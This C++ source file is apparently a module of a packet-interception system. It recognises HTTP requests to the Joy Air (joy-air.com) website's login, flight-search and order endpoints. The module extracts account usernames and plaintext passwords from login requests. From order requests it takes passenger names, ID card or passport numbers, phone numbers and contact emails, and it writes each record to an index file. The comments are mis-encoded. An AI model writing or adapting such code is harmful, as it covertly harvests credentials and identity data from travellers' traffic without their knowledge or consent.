
#include "StdAfx.h"

#include "PlaneXingFuAirlines.h"

plane::XingFuAirlines::XingFuAirlines(HttpSession *http_session, const string &pro_name) : Airplane(http_session,pro_name)
{
	
}

plane::XingFuAirlines::~XingFuAirlines()
{
	
}

// ID_CARD ���֤��PASSPORT ���գ�OTHER ����֤��
string plane::XingFuAirlines::GetIdType(string idType)
{
	string idTypeTrue;
	if (idType == "ID_CARD"){idTypeTrue = "���֤";}
	if (idType == "PASSPORT"){idTypeTrue = "����";}
	if (idType == "OTHER"){idTypeTrue = "����֤��";}
	return idTypeTrue;
}

// NI ���֤��PP ���գ�JG ���� ID ����
string plane::XingFuAirlines::GetIdTypeNew(string idType)
{
	string idTypeTrue;
	if (idType == "NI"){idTypeTrue = "���֤";}
	if (idType == "PP"){idTypeTrue = "����";}
	if (idType == "JG"){idTypeTrue = "����";}
	if (idType == "ID"){idTypeTrue = "����";}
	return idTypeTrue;
}


int plane::XingFuAirlines::IsXingFuAirlines(HttpSession *http_session)
{
	//��¼
	if((http_session->m_Requestline.m_Host.Find("www.joy-air.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/pssweb/memberauth/login")!=-1) )
	{
		return kpclogin;
	}
	//�г�Ԥ��
	if((http_session->m_Requestline.m_Host.Find("www.joy-air.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/pssweb/ota/flights")!=-1))
	{
		return kpcticket;
	}	
	//�ύ����
	if((http_session->m_Requestline.m_Host.Find("www.joy-air.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/pssweb/orders")!=-1))
	{
		return kpcorder;
	}
	//��¼�°�
	if((http_session->m_Requestline.m_Host.Find("www.joy-air.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/api/userNoAuth!loginByUser.action")!=-1) )
	{
		return kpcloginnew;
	}
	//�г�Ԥ���°�
	if((http_session->m_Requestline.m_Host.Find("www.joy-air.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/api/flight!getFlights.action")!=-1))
	{
		return kpcticketnew;
	}
	//�ύ�����°�
	if((http_session->m_Requestline.m_Host.Find("www.joy-air.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/api/flightOrder!createOrder.action")!=-1))
	{
		return kpcordernew;
	}
	return 0;
}

int plane::XingFuAirlines::Process(const char *packet,int action)
{
	//��¼
	if (action == kpclogin)
	{
		return pclogin(packet);
	}
	//�г�Ԥ��
	if (action == kpcticket)
	{
		return pcticket(packet);
	}
	//�ύ����
	if (action == kpcorder)
	{
		return pcorder(packet);
	}
	//��¼�°�
	if (action == kpcloginnew)
	{
		return pcloginnew(packet);
	}
	//�г�Ԥ���°�
	if (action == kpcticketnew)
	{
		return pcticketnew(packet);
	}
	//�ύ�����°�
	if (action == kpcordernew)
	{
		return pcordernew(packet);
	}
	return 1;
}

//��¼
int plane::XingFuAirlines::pclogin(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//��ȡjson
	Json::Value value;
	Json::Reader reader;
	if (reader.parse(src_data,value))
	{
		username = value["username"].asString();
		password = value["password"].asString();
	}
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ = 
		"user=" + username +"\r\n" + //�˺�
		"pass=" + password + "\r\n" + //����
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}

// �г�Ԥ��
int plane::XingFuAirlines::pcticket(const char *packet)
{
	string src_data = http_session_->m_Requestline.m_URL.GetBuffer(0);
	src_data = ms_->UrlDecode(src_data);
	ms_->Replace(src_data,"?","&");
	ms_->SplitStringToMap(src_data,'&','=');
	//����
	adtCount = ms_->GetValueFromMapByKey("adultNum",true);
	chdCount = ms_->GetValueFromMapByKey("childNum",true);
	deptCdTxt = ms_->GetValueFromMapByKey("orgcity",true);
	arrCdTxt = ms_->GetValueFromMapByKey("dstcity",true);
	deptDt = ms_->GetValueFromMapByKey("depDate",true);
	if (deptCdTxt.empty() || arrCdTxt.empty() || deptDt.empty())
	{
		return 0;
	}
	output_text_ =
		"netmark=" + adtCount + "\r\n" +	//��������
		"onick=" +	chdCount + "\r\n" +		//��ͯ����
		"nick=" +	deptCdTxt + "\r\n" +	//������
		"msg=" + 	arrCdTxt + "\r\n" +		//Ŀ�ĵ� 
		"servername=" + deptDt + "\r\n" +	//��������
		"state=���̲�ѯ\r\n";
	WriteIndexFile();
	return 1;
}

//�ύ����
int plane::XingFuAirlines::pcorder(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//��ϵ����Ϣ
	Json::Reader reader;
	Json::Value value;
	string ContactName,ContactEmail,ContactMobilePhone;
	Json::Value airTicketParamInfoList;
	if (reader.parse(src_data,value))
	{
		Json::Value arrayObj =value["contactWayParamInfo"];
		ContactName = arrayObj["contactName"].asString();
		ContactEmail = arrayObj["contactEmail"].asString();
		ContactMobilePhone =arrayObj["contactMobilePhone"].asString();
		airTicketParamInfoList = value["airTicketParamInfoList"];
	}
	for (int i=0;i<airTicketParamInfoList.size();i++)
	{
		//����
		string name = airTicketParamInfoList[i]["paxFirstName"].asString();
		//���֤��
		string carno = airTicketParamInfoList[i]["cardNo"].asString();
		//֤������
		string cardtype = airTicketParamInfoList[i]["cardType"].asString(); 
		cardtype = this->GetIdType(cardtype);
		//�ֻ���
		string mobilephone = airTicketParamInfoList[i]["mobilePhone"].asString();

		if (ContactName.empty() || ContactEmail.empty() || ContactMobilePhone.empty() || name.empty() || carno.empty() || mobilephone.empty())
		{
			return 0;
		}
		output_text_ =
			"mid=" + 	ContactName + "\r\n" +			//��ϵ������
			"oid=" + 	ContactMobilePhone + "\r\n" +	//��ϵ�˵绰
			"imsi=" + 	ContactEmail + "\r\n" +			//��ϵ������
			"msgtype=" + name + "\r\n" +				//�˿�����
			"clientmsg=" + 	mobilephone + "\r\n" +		//�˿͵绰
			"webname=" + 	cardtype + "\r\n" +			//�˿�֤������
			"subject=" + 	carno + "\r\n" +			//�˿�֤����
			"state=�ύ����\r\n";
		WriteIndexFile();
	}
	return 1;
}

//�°��¼
int plane::XingFuAirlines::pcloginnew(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//��ȡjson
	Json::Value value;
	Json::Reader reader;
	if (reader.parse(src_data,value))
	{
		username = value["loginid"].asString();
		password = value["pwd"].asString();
	}
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ = 
		"user=" + username +"\r\n" + //�˺�
		"pass=" + password + "\r\n" + //����
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}
//�г�Ԥ�� �°�
int plane::XingFuAirlines::pcticketnew(const char *packet)
{
	string src_data(packet);
	string tookit = "{\"orgCity";
	if (src_data.rfind(tookit) != -1)
	{
		src_data = src_data.substr(src_data.rfind(tookit));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	Json::Value value;
	Json::Reader read;
	if (read.parse(src_data,value))
	{
		triptype_ = value["tripType"].asString();
		//������
		deptCdTxt = value["orgCity"].asString();
		//Ŀ�ĵ�
		arrCdTxt = value["dstCity"].asString();
		//��������
		deptDt = value["flightdate"].asString();
		if (deptCdTxt.empty() || arrCdTxt.empty() || deptDt.empty())
		{
			return 0;
		}
		if (triptype_ == "ONEWAY")
		{
			output_text_ =
				"nick=" +	deptCdTxt + "\r\n" +	//������
				"msg=" + 	arrCdTxt + "\r\n" +		//Ŀ�ĵ� 
				"servername=" + deptDt + "\r\n" +	//��������
				"state=���̲�ѯ\r\n";
			WriteIndexFile();
		}
        if (triptype_ == "ROUNDTRIP")
        {
			output_text_ =
				"nick=" +	deptCdTxt + "\r\n" +	//������
				"msg=" + 	arrCdTxt + "\r\n" +		//Ŀ�ĵ� 
				"servername=" + deptDt + "\r\n" +	//��������
				"state=������ѯ\r\n";
			WriteIndexFile();
        }
	}
	return 1;
}

//�ύ�����°�
int plane::XingFuAirlines::pcordernew(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//��ϵ����Ϣ
	Json::Reader reader;
	Json::Value value;
	string ContactName,ContactEmail,ContactMobilePhone;
	Json::Value airTicketParamInfoList;
	if (reader.parse(src_data,value))
	{
		ContactName = value["contactName"].asString();
		ContactEmail = value["contactEmail"].asString();
		ContactMobilePhone =value["contactMobile"].asString();
		airTicketParamInfoList = value["passengers"];
	}
	for (int i=0;i<airTicketParamInfoList.size();i++)
	{
		//����
		string name = airTicketParamInfoList[i]["name"].asString();
		//֤����
		string carno = airTicketParamInfoList[i]["certificateNumber"].asString();
		//֤������
		string cardtype = airTicketParamInfoList[i]["certificateType"].asString(); 
		cardtype = this->GetIdTypeNew(cardtype);
		//�ֻ���
		string mobilephone = airTicketParamInfoList[i]["phone"].asString();
		
		if (ContactName.empty() || ContactMobilePhone.empty() || name.empty() || carno.empty() || mobilephone.empty())
		{
			return 0;
		}
		output_text_ =
			"mid=" + 	ContactName + "\r\n" +			//��ϵ������
			"oid=" + 	ContactMobilePhone + "\r\n" +	//��ϵ�˵绰
			"imsi=" + 	ContactEmail + "\r\n" +			//��ϵ������
			"msgtype=" + name + "\r\n" +				//�˿�����
			"clientmsg=" + 	mobilephone + "\r\n" +		//�˿͵绰
			"webname=" + 	cardtype + "\r\n" +			//�˿�֤������
			"subject=" + 	carno + "\r\n" +			//�˿�֤����
			"state=�ύ����\r\n";
		WriteIndexFile();
	}
	return 1;
}